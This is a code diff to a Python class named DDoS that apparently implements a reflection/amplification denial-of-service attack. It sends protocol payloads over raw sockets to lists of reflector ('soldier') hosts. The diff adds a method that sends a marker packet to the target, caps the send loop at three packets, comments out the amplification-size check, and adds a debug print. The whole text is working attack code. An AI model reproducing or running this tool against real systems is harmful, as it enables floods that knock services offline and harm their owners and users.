@@ -214,6 +214,16 @@ class DDoS(object):
 		finally:
 			sock.close()
 		return len(data), len(packet)
+	def SentTrueIp(self,proto,soldier, domain=''):
+		'''
+			Mark for True source ip
+		'''
+		sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+		sock.settimeout(2)		
+		packet = 'this is for send true source ip'
+		sock.sendto(packet, (soldier, PORT[proto]))
+		sock.close()
+		return len(packet)		
 	def __GetQName(self, domain):
 		'''
 			QNAME A domain name represented as a sequence of labels 
@@ -239,7 +249,8 @@ class DDoS(object):
 			_files[proto].append(f)		# _files = {'proto':['file_name', file_handle]}
 		sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
 		i = 0
-		while self.event.isSet():
+		self.SentTrueIp(proto,self.target)
+		while npackets <3:
 			for proto in _files:
 				soldier = _files[proto][FILE_HANDLE].readline().strip()
 				if soldier:
@@ -262,15 +273,16 @@ class DDoS(object):
 							nbytes += amplification[proto][soldier][domain]
 					else:
 						if not amplification[proto].has_key(soldier):
-							size, _ = self.GetAmpSize(proto, soldier)
+							'''size, _ = self.GetAmpSize(proto, soldier)
 							if size<len(PAYLOAD[proto]):
 								continue
 							else:
-								amplification[proto][soldier] = size
+								amplification[proto][soldier] = size'''
 						amp = PAYLOAD[proto]
 						npackets += 1
+						print "npackets" +str(npackets)
 						i+=1
-						nbytes += amplification[proto][soldier]
+						#nbytes += amplification[proto][soldier]
 						self.__send(sock, soldier, proto, amp)
 				else:
 					_files[proto][FILE_HANDLE].seek(0)
